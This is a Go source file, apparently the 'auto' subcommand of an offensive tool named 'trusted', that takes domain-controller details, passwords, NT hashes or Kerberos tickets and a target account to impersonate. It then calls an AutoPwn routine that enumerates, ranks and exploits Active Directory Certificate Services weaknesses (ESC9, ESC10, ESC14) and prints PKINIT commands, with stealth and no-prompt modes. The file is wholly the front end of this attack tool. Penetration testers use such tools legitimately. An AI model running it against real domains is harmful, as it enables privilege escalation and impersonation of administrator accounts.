package main

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"github.com/loudmumble/trusted/pkg/pki"
	"github.com/spf13/cobra"
)

var autoCmd = &cobra.Command{
	Use:   "auto",
	Short: "Auto-pwn — enumerate, prioritize, and exploit ADCS paths",
	Long: `Automated ADCS exploitation: enumerate templates, prioritize attack paths,
exploit, and output PKINIT commands — all in one shot.

Examples:
  trusted auto -d corp.local -dc dc01 -U admin@corp.local -u user -p pass
  ted auto -d corp.local -dc dc01 -U admin@corp.local -u user -p pass --auto-run`,
	RunE: func(cmd *cobra.Command, args []string) error {
		targetDC, _ := cmd.Flags().GetString("dc")
		domain, _ := cmd.Flags().GetString("domain")
		username, _ := cmd.Flags().GetString("username")
		password, _ := cmd.Flags().GetString("password")
		hash, _ := cmd.Flags().GetString("hash")
		kerberos, _ := cmd.Flags().GetBool("kerberos")
		ccache, _ := cmd.Flags().GetString("ccache")
		keytabPath, _ := cmd.Flags().GetString("keytab")
		kdcIP, _ := cmd.Flags().GetString("dc-ip")
		upn, _ := cmd.Flags().GetString("upn")
		attackerDN, _ := cmd.Flags().GetString("adn")
		victimDN, _ := cmd.Flags().GetString("vdn")
		outputDir, _ := cmd.Flags().GetString("output-dir")
		dryRun, _ := cmd.Flags().GetBool("dry-run")
		autoRun, _ := cmd.Flags().GetBool("auto-run")
		outputJSON, _ := cmd.Flags().GetBool("json")
		useTLS, _ := cmd.Flags().GetBool("ldaps")
		useStartTLS, _ := cmd.Flags().GetBool("start-tls")
		stealth, _ := cmd.Flags().GetBool("stealth")
		timeout, _ := cmd.Flags().GetInt("timeout")

		var oldStdout *os.File
		if outputJSON {
			oldStdout = os.Stdout
			devNull, err := os.Open(os.DevNull)
			if err != nil {
				return fmt.Errorf("open %s: %w", os.DevNull, err)
			}
			os.Stdout = devNull
			autoRun = true
		}

		if targetDC == "" || domain == "" {
			return fmt.Errorf("-dc and -d are required")
		}
		if !kerberos && (username == "" || (password == "" && hash == "")) {
			return fmt.Errorf("LDAP auth required: use -u <user> -p <pass> (or -H <NT_HASH> or -k)")
		}
		if upn == "" {
			return fmt.Errorf("-U (UPN) is required (e.g. -U administrator@%s)", domain)
		}
		if !strings.Contains(upn, "@") {
			return fmt.Errorf("-U must be a full UPN (user@domain), got %q — try %s@%s", upn, upn, domain)
		}
		if outputDir == "" {
			outputDir = "./out"
		}

		cfg := &pki.AutoPwnConfig{
			ADCSConfig: &pki.ADCSConfig{
				TargetDC:    targetDC,
				Domain:      domain,
				Username:    username,
				Password:    password,
				Hash:        hash,
				Kerberos:    kerberos,
				CCache:      ccache,
				Keytab:      keytabPath,
				KDCIP:       kdcIP,
				UseTLS:      useTLS,
				UseStartTLS: useStartTLS,
				Stealth:     stealth,
				Timeout:     timeout,
			},
			TargetUPN:   upn,
			AttackerDN:  attackerDN,
			VictimDN:    victimDN,
			OutputDir:   outputDir,
			DryRun:      dryRun,
			Interactive: !autoRun,
		}

		result, err := pki.AutoPwn(context.Background(), cfg)

		if outputJSON {
			os.Stdout = oldStdout
			if err != nil {
				errResult := map[string]string{"error": err.Error()}
				data, _ := json.MarshalIndent(errResult, "", "  ")
				fmt.Println(string(data))
				return nil
			}
			if result == nil {
				res := map[string]string{"status": "no_exploitable_paths"}
				data, _ := json.MarshalIndent(res, "", "  ")
				fmt.Println(string(data))
				return nil
			}
			data, _ := json.MarshalIndent(result, "", "  ")
			fmt.Println(string(data))
			return nil
		}

		if err != nil {
			return err
		}

		if result == nil {
			fmt.Println("[*] No exploitable paths found (or dry-run completed)")
		}

		return nil
	},
}

func init() {
	rootCmd.AddCommand(autoCmd)

	autoCmd.Flags().StringP("upn", "U", "", "Target UPN to impersonate")
	autoCmd.Flags().String("adn", "", "Attacker DN (ESC9/10)")
	autoCmd.Flags().String("vdn", "", "Victim DN (ESC14)")
	autoCmd.Flags().String("output-dir", "./out", "Output directory for certs")
	autoCmd.Flags().Bool("dry-run", false, "Enumerate and plan only, don't exploit")
	autoCmd.Flags().Bool("auto-run", false, "Execute without interactive prompts")
}
